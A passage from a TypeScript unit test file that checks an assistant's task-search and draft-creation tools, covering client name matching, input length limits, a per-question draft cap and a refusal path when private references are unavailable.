      expect(listTasksByIds).not.toHaveBeenCalled();
      expect(listClients).not.toHaveBeenCalled();
    });
  });

  it("C24 task records (P9 F8): a task's client name maps to the active client of that exact name; an inactive one only when no active one has it", async () => {
    vi.mocked(listClients).mockResolvedValue([
      { ...CLIENTS[2], id: "c_zen_old", status: "churned" },
      CLIENTS[2],
      { ...CLIENTS[0], id: "c_gone", name: "Gone Clinic", status: "churned" }
    ]);
    vi.mocked(listOpenTasks).mockResolvedValue([task({ id: "t_z", clientName: "Zenith Law" }), task({ id: "t_g", clientName: "Gone Clinic" }), task({ id: "t_x", clientName: "zenith law" })]);
    const ctx = makeCtx();
    await runTool(ctx, "search_tasks", searchTasks());
    expect([...ctx.consultedClients].sort()).toEqual(["c_gone", "c_zen"]);
  });

  it("an instruction over 2,000 → bad_input; the 4th call → limit; the private-refs fallback refuses without a call", async () => {
    const long = await runTool(makeCtx(), "create_draft", { ...input, instruction: "x".repeat(2001) });
    expect(long.record.error).toBe("bad_input");
    const ctx = makeCtx();
    for (let i = 0; i < 3; i += 1) await runTool(ctx, "create_draft", input);
    const fourth = await runTool(ctx, "create_draft", input);
    expect(fourth.text).toBe("Only 3 drafts can be started per question. Tell him which ones are left.");
    vi.mocked(createChatReplyDraft).mockClear();
    setPrivateRefsSupportedForTests(false);
    const priv = makeCtx({ consulted: new ConsultedBudget(500) });
    priv.consulted.admit(["th_other"]);
    const refused = await runTool(priv, "create_draft", input);
    expect(refused.json).toMatchObject({ draft: null, refused: "unavailable", note: "Drafting isn't available right now." });
    expect(vi.mocked(createChatReplyDraft)).not.toHaveBeenCalled();
    const clean = await runTool(makeCtx(), "create_draft", input);
    expect(clean.json.draft).toMatchObject({ existing: false });
  });
});
